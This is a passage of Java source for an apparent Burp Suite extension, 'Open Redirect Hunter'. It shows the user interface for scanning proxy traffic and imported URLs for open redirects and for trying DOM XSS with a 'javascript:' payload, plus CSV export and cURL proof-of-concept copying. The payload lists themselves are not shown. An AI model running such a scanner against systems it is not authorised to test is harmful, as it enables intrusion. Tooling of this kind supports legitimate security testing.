            JPanel categoriesPanel = new JPanel();
            categoriesPanel.setLayout(new BoxLayout(categoriesPanel, BoxLayout.Y_AXIS));
            categoriesPanel.setBorder(BorderFactory.createTitledBorder("Static payload categories (each defaults OFF)"));

            for (java.util.Map.Entry<String, String[]> entry : PAYLOAD_CATEGORIES.entrySet())
            {
                String name = entry.getKey();
                String[] templates = entry.getValue();

                JPanel catBox = new JPanel(new BorderLayout());
                JCheckBox cb = new JCheckBox(name + "  (" + templates.length + " payloads)",
                        Boolean.TRUE.equals(cfg.categoryEnabled.get(name)));
                cb.addActionListener(e -> cfg.categoryEnabled.put(name, cb.isSelected()));
                catBox.add(cb, BorderLayout.NORTH);

                JTextArea preview = new JTextArea(String.join("\n", templates));
                preview.setEditable(false);
                preview.setFont(new Font("Monospaced", Font.PLAIN, 11));
                preview.setForeground(Color.DARK_GRAY);
                preview.setBorder(BorderFactory.createEmptyBorder(2, 24, 8, 4));
                catBox.add(preview, BorderLayout.CENTER);

                categoriesPanel.add(catBox);
                categoriesPanel.add(new JSeparator());
            }
            panel.add(categoriesPanel);

            JScrollPane scroll = new JScrollPane(panel);
            scroll.getVerticalScrollBar().setUnitIncrement(16);
            return scroll;
        }

        private JPanel buildSettings()
        {
            JPanel panel = new JPanel(new BorderLayout());
            panel.setBorder(BorderFactory.createTitledBorder("Open Redirect Hunter settings"));

            JPanel checks = new JPanel(new GridLayout(0, 4, 6, 4));
            cbEnabled = checkbox("Enable Extension (live Proxy monitor)", cfg.enabled);
            cbGet = checkbox("Test GET / URL Params", cfg.enableGet);
            cbPostBody = checkbox("Test POST Body Params", cfg.testPostBody);
            cbHighlight = checkbox("Highlight Findings", cfg.highlight);
            cbScopeOnly = checkbox("In-Scope Only", cfg.scopeOnly);
            cbDedup = checkbox("Dedup (skip re-testing same endpoint+param, faster)", cfg.dedupEnabled);
            cbHeadlessFallback = checkbox("DOM Redirect Fallback (headless, slow)", cfg.headlessFallback);
            cbDomFallbackOnLive = checkbox("...also auto-run DOM Fallback on Live Traffic (slower!)", cfg.domFallbackOnLive);
            cbTryDomXss = checkbox("Try DOM XSS on confirmed DOM redirects (javascript: payload)", cfg.tryDomXss);
            cbStopAfterFirstFinding = checkbox("Stop testing a URL's other params after first finding (faster)", cfg.stopAfterFirstFindingPerUrl);
            for (JCheckBox cb : new JCheckBox[]{cbEnabled, cbGet, cbPostBody, cbHighlight, cbScopeOnly, cbDedup, cbHeadlessFallback, cbDomFallbackOnLive, cbTryDomXss, cbStopAfterFirstFinding})
                checks.add(cb);

            JPanel fields = new JPanel(new GridLayout(0, 2, 6, 4));
            fields.add(new JLabel("Sentinel Host:"));
            tfSentinel = new JTextField(cfg.sentinelHost);
            fields.add(tfSentinel);
            fields.add(new JLabel("Max Threads:"));
            tfThreads = new JTextField(String.valueOf(cfg.maxThreads));
            fields.add(tfThreads);
            fields.add(new JLabel("Rate Limit (ms between requests):"));
            tfRateLimit = new JTextField(String.valueOf(cfg.rateLimitMs));
            fields.add(tfRateLimit);
            fields.add(new JLabel("Headless Deep-Verify Timeout (sec):"));
            tfHeadlessTimeout = new JTextField(String.valueOf(cfg.headlessTimeoutSec));
            fields.add(tfHeadlessTimeout);

            JPanel buttons = new JPanel(new FlowLayout(FlowLayout.LEFT));
            JButton apply = new JButton("Apply Settings");
            apply.addActionListener(e -> applySettings());
            JButton clear = new JButton("Clear Results");
            clear.addActionListener(e -> {
                model.clear();
                owner.clearHostCache();
                owner.resetCounters();
                refreshStats(0, 0);
                try { reqViewer.setRequest(null); respViewer.setResponse(null); } catch (Exception ignored) {}
                log("Results cleared.");
            });
            JButton export = new JButton("Export CSV");
            export.addActionListener(e -> exportCsv());
            JButton scanHistory = new JButton("Scan Proxy History");
            scanHistory.addActionListener(e -> owner.scanProxyHistory());
            JButton scanSiteMap = new JButton("Scan Site Map");
            scanSiteMap.addActionListener(e -> owner.scanSiteMap());
            JButton importUrls = new JButton("Import URLs...");
            importUrls.addActionListener(e -> showImportDialog());
            JButton cancelScan = new JButton("Cancel Scan");
            cancelScan.setForeground(new Color(160, 0, 0));
            cancelScan.addActionListener(e -> owner.cancelScan());
            buttons.add(apply); buttons.add(clear); buttons.add(export);
            buttons.add(scanHistory); buttons.add(scanSiteMap); buttons.add(importUrls); buttons.add(cancelScan);

            JPanel inner = new JPanel(new BorderLayout());
            inner.add(checks, BorderLayout.NORTH);
            inner.add(fields, BorderLayout.CENTER);
            inner.add(buttons, BorderLayout.SOUTH);
            panel.add(inner, BorderLayout.CENTER);
            return panel;
        }

        private JCheckBox checkbox(String label, boolean state)
        {
            JCheckBox cb = new JCheckBox(label, state);
            cb.addActionListener(e -> applySettings());
            return cb;
        }

        private void applySettings()
        {
            cfg.enabled = cbEnabled.isSelected();
            cfg.enableGet = cbGet.isSelected();
            cfg.testPostBody = cbPostBody.isSelected();
            cfg.highlight = cbHighlight.isSelected();
            cfg.scopeOnly = cbScopeOnly.isSelected();
            cfg.dedupEnabled = cbDedup.isSelected();
            cfg.headlessFallback = cbHeadlessFallback.isSelected();
            cfg.domFallbackOnLive = cbDomFallbackOnLive.isSelected();
            cfg.tryDomXss = cbTryDomXss.isSelected();
            cfg.stopAfterFirstFindingPerUrl = cbStopAfterFirstFinding.isSelected();
            String sentinel = tfSentinel.getText().trim();
            if (!sentinel.isEmpty()) cfg.sentinelHost = sentinel;
            try { cfg.maxThreads = Math.max(1, Integer.parseInt(tfThreads.getText().trim())); } catch (Exception ignored) {}
            try { cfg.rateLimitMs = Math.max(0, Integer.parseInt(tfRateLimit.getText().trim())); } catch (Exception ignored) {}
            try { cfg.headlessTimeoutSec = Math.max(2, Integer.parseInt(tfHeadlessTimeout.getText().trim())); } catch (Exception ignored) {}
            log("Settings applied. sentinel=" + cfg.sentinelHost + " threads=" + cfg.maxThreads + " rateLimit=" + cfg.rateLimitMs + "ms");
        }

        private JPanel buildStatusBar()
        {
            JPanel bar = new JPanel(new BorderLayout());
            statsLabel = new JLabel(" Monitored: 0   Findings: 0 ");
            JPanel left = new JPanel(new FlowLayout(FlowLayout.LEFT));
            left.add(statsLabel);
            bar.add(left, BorderLayout.WEST);
            bar.setBorder(BorderFactory.createEmptyBorder(2, 6, 2, 6));
            return bar;
        }

        void refreshStats(int monitored, int findings)
        {
            SwingUtilities.invokeLater(() -> {
                int confirmed = 0, domXss = 0, highImpact = 0, likely = 0;
                for (ResultRow r : model.all())
                {
                    String c = r.confidence == null ? "" : r.confidence;
                    if (c.contains("DOM XSS")) domXss++;
                    else if (c.startsWith("CONFIRMED")) confirmed++;
                    else if (c.startsWith("LIKELY")) likely++;
                    if (r.highImpact) highImpact++;
                }
                statsLabel.setText(String.format(
                        " Monitored: %d   Findings: %d    |    Confirmed: %d   DOM-XSS: %d   High-Impact: %d   Likely: %d ",
                        monitored, findings, confirmed, domXss, highImpact, likely));
            });
        }

        void log(String msg)
        {
            String line = new SimpleDateFormat("HH:mm:ss").format(new Date()) + "  " + msg;
            api.logging().logToOutput(line);
            SwingUtilities.invokeLater(() -> {
                logArea.append(line + "\n");
                logArea.setCaretPosition(logArea.getDocument().getLength());
            });
        }

        /**
         * "Import URLs" dialog — paste a list (one per line, e.g. from waybackurls/gau output) or
         * load a .txt file, then kick off a scan against each URL's CURRENT live response, exactly
         * like a Site Map or Proxy History entry.
         */
        private void showImportDialog()
        {
            JDialog dialog = new JDialog((Frame) SwingUtilities.getWindowAncestor(scannerPanel),
                    "Import URLs for Open Redirect Hunter", true);
            dialog.setLayout(new BorderLayout());

            JTextArea urlArea = new JTextArea(18, 70);
            urlArea.setFont(new Font("Monospaced", Font.PLAIN, 12));
            JScrollPane areaScroll = new JScrollPane(urlArea);

            JLabel hint = new JLabel("  One URL per line — e.g. output from waybackurls, gau, katana, etc.");
            hint.setBorder(BorderFactory.createEmptyBorder(6, 6, 6, 6));

            JPanel topPanel = new JPanel(new BorderLayout());
            topPanel.add(hint, BorderLayout.NORTH);

            JPanel buttonsRow = new JPanel(new FlowLayout(FlowLayout.RIGHT));
            JButton loadFile = new JButton("Load from File...");
            loadFile.addActionListener(e -> {
                JFileChooser chooser = new JFileChooser();
                if (chooser.showOpenDialog(dialog) == JFileChooser.APPROVE_OPTION)
                {
                    try
                    {
                        java.util.List<String> lines = java.nio.file.Files.readAllLines(chooser.getSelectedFile().toPath());
                        if (!urlArea.getText().trim().isEmpty()) urlArea.append("\n");
                        urlArea.append(String.join("\n", lines));
                    }
                    catch (Exception ex) { log("Failed to load file: " + ex); }
                }
            });
            JButton clearArea = new JButton("Clear");
            clearArea.addActionListener(e -> urlArea.setText(""));
            JButton cancel = new JButton("Cancel");
            cancel.addActionListener(e -> dialog.dispose());
            JButton startScan = new JButton("Start Scan");
            startScan.addActionListener(e -> {
                String[] lines = urlArea.getText().split("\\r?\\n");
                java.util.List<String> urls = new ArrayList<>();
                for (String l : lines) if (!l.trim().isEmpty()) urls.add(l.trim());
                if (urls.isEmpty())
                {
                    JOptionPane.showMessageDialog(dialog, "Paste or load at least one URL first.");
                    return;
                }
                dialog.dispose();
                owner.scanImportedUrls(urls);
            });
            buttonsRow.add(loadFile);
            buttonsRow.add(clearArea);
            buttonsRow.add(cancel);
            buttonsRow.add(startScan);

            dialog.add(topPanel, BorderLayout.NORTH);
            dialog.add(areaScroll, BorderLayout.CENTER);
            dialog.add(buttonsRow, BorderLayout.SOUTH);
            dialog.setSize(760, 480);
            dialog.setLocationRelativeTo(scannerPanel);
            dialog.setVisible(true);
        }

        private void exportCsv()
        {
            JFileChooser chooser = new JFileChooser();
            chooser.setSelectedFile(new File("open_redirect_findings.csv"));
            if (chooser.showSaveDialog(root) != JFileChooser.APPROVE_OPTION) return;
            File file = chooser.getSelectedFile();
            try (FileWriter w = new FileWriter(file))
            {
                w.write(String.join(",", ResultsTableModel.COLUMNS) + "\n");
                for (ResultRow r : model.all())
                {
                    String[] cells = {
                            new SimpleDateFormat("HH:mm:ss").format(r.time), r.method, r.url, r.param,
                            r.type, r.payload, r.evidenceDetail, r.confidence
                    };
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < cells.length; i++)
                    {
                        if (i > 0) sb.append(",");
                        sb.append("\"").append(cells[i] == null ? "" : cells[i].replace("\"", "\"\"")).append("\"");
                    }
                    w.write(sb + "\n");
                }
                log("Exported " + model.getRowCount() + " rows to " + file.getAbsolutePath());
            }
            catch (Exception e)
            {
                log("Export failed: " + e);
            }
        }

        // --- right-click context menu on the results table ---
        private class TableMouse extends MouseInputAdapter
        {
            @Override public void mousePressed(MouseEvent e) { maybeShow(e); }
            @Override public void mouseReleased(MouseEvent e) { maybeShow(e); }

            private void maybeShow(MouseEvent e)
            {
                if (!e.isPopupTrigger()) return;
                int viewRow = table.rowAtPoint(e.getPoint());
                if (viewRow < 0) return;
                table.setRowSelectionInterval(viewRow, viewRow);
                int modelRow = table.convertRowIndexToModel(viewRow);
                ResultRow row = model.get(modelRow);

                JPopupMenu menu = new JPopupMenu();
                JMenuItem sendRepeater = new JMenuItem("Send to Repeater");
                sendRepeater.addActionListener(a -> {
                    try
                    {
                        api.repeater().sendToRepeater(row.evidence.request(), "ORH-" + row.param);
                        log("Sent to Repeater: " + row.param);
                    }
                    catch (Exception ex) { log("Send to Repeater failed: " + ex); }
                });
                JMenuItem copyUrl = new JMenuItem("Copy URL");
                copyUrl.addActionListener(a -> copyToClipboard(row.url));
                JMenuItem copyPayload = new JMenuItem("Copy Payload");
                copyPayload.addActionListener(a -> copyToClipboard(row.payload));
                JMenuItem copyCurl = new JMenuItem("Copy as cURL");
                copyCurl.addActionListener(a -> {
                    try { copyToClipboard(toCurl(row.evidence != null ? row.evidence.request() : null)); log("Copied cURL for: " + row.param); }
                    catch (Exception ex) { log("Copy as cURL failed: " + ex); }
                });
                JMenuItem copyEvidence = new JMenuItem("Copy Evidence");
                copyEvidence.addActionListener(a -> copyToClipboard(row.evidenceDetail));
                JMenuItem deepVerify = new JMenuItem("Deep Verify (Headless Browser)");
                deepVerify.addActionListener(a -> owner.deepVerify(row));
                JMenuItem tryDomXss = new JMenuItem("Try DOM XSS (javascript: payload)");
                tryDomXss.addActionListener(a -> owner.tryDomXssFromRow(row));

                menu.add(sendRepeater);
                menu.add(copyUrl);
                menu.add(copyPayload);
                menu.add(copyCurl);
                menu.add(copyEvidence);
                menu.addSeparator();
                menu.add(deepVerify);
                menu.add(tryDomXss);
                menu.show(table, e.getX(), e.getY());
            }

            private void copyToClipboard(String text)
            {
                Toolkit.getDefaultToolkit().getSystemClipboard().setContents(new StringSelection(text == null ? "" : text), null);
            }

            // Builds a ready-to-paste cURL command from the attack request (for a quick PoC in a report).
            private String toCurl(HttpRequest req)
            {
                if (req == null) return "";
                StringBuilder sb = new StringBuilder("curl -sS -k -i");
                if (!"GET".equalsIgnoreCase(req.method())) sb.append(" -X ").append(req.method());
                for (burp.api.montoya.http.message.HttpHeader h : req.headers())
                {
                    String n = h.name();
                    if (n.equalsIgnoreCase("Content-Length")) continue;
                    sb.append(" -H '").append(h.name()).append(": ").append(h.value().replace("'", "'\\''")).append("'");
                }
                String body = req.bodyToString();
                if (body != null && !body.isEmpty()) sb.append(" --data-raw '").append(body.replace("'", "'\\''")).append("'");
                sb.append(" '").append(req.url().replace("'", "'\\''")).append("'");
                return sb.toString();
            }
        }
    }
}
